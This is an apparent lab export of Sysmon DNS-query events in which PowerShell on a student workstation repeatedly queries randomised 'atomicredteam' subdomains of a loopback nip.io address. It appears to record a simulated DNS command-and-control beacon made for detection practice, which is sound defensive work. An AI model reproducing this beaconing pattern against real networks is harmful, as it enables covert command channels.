"2025-12-26 11:26:18.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173850,"Query: atomicredteam-256110.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:18.221","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:18.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173851,"Query: atomicredteam-409917.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:18.260","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:18.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173852,"Query: atomicredteam-715732.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:18.299","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:18.918 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173853,"Query: atomicredteam-227974.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:18.361","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:18.919 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173854,"Query: atomicredteam-132190.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:18.530","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:18.919 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173855,"Query: atomicredteam-218338.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:18.848","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:19.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173856,"Query: atomicredteam-620215.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:18.889","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:19.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173857,"Query: atomicredteam-207259.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:18.926","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:19.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173858,"Query: atomicredteam-594145.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:18.966","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:19.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173859,"Query: atomicredteam-219318.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:19.004","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:19.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173860,"Query: atomicredteam-169402.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:19.338","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:19.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173861,"Query: atomicredteam-747812.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:19.381","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:19.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173862,"Query: atomicredteam-379240.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:19.421","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:19.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173863,"Query: atomicredteam-260347.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:19.595","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:19.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173864,"Query: atomicredteam-443747.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:19.636","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:19.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173865,"Query: atomicredteam-213638.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:19.676","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:19.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173866,"Query: atomicredteam-523281.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:19.716","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:19.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173867,"Query: atomicredteam-976939.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:19.754","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:19.925 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173868,"Query: atomicredteam-603971.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:19.794","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:20.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173869,"Query: atomicredteam-292184.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:19.834","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:20.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173870,"Query: atomicredteam-16217.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:19.913","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:20.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173871,"Query: atomicredteam-766549.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:19.952","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:20.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173872,"Query: atomicredteam-670645.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:19.990","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:20.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173873,"Query: atomicredteam-873024.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:20.028","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:20.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173874,"Query: atomicredteam-636538.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:20.068","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:20.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173875,"Query: atomicredteam-657469.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:20.107","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:20.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173876,"Query: atomicredteam-78561.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:20.438","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:20.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173877,"Query: atomicredteam-367768.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:20.477","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:20.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173878,"Query: atomicredteam-811350.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:20.517","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:20.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173879,"Query: atomicredteam-895157.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:20.699","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:20.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173880,"Query: atomicredteam-554320.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:20.739","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:20.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173881,"Query: atomicredteam-612649.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:20.779","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:21.975 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173882,"Query: atomicredteam-454123.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:20.817","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:21.975 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173883,"Query: atomicredteam-688412.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:21.172","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:21.975 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173884,"Query: atomicredteam-124171.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:21.211","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:21.975 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173885,"Query: atomicredteam-617867.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:21.281","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173889,"Query: atomicredteam-932588.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:21.322","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173890,"Query: atomicredteam-623004.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:21.363","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173891,"Query: atomicredteam-720939.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:21.403","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173892,"Query: atomicredteam-864231.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:21.448","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173893,"Query: atomicredteam-547778.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:21.487","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173894,"Query: atomicredteam-812943.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:21.527","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173895,"Query: atomicredteam-207751.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:21.700","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173896,"Query: atomicredteam-207807.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:22.050","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173897,"Query: atomicredteam-141738.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:22.116","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173898,"Query: atomicredteam-92582.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:22.156","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173899,"Query: atomicredteam-213765.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:22.248","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173900,"Query: atomicredteam-962975.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:22.290","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
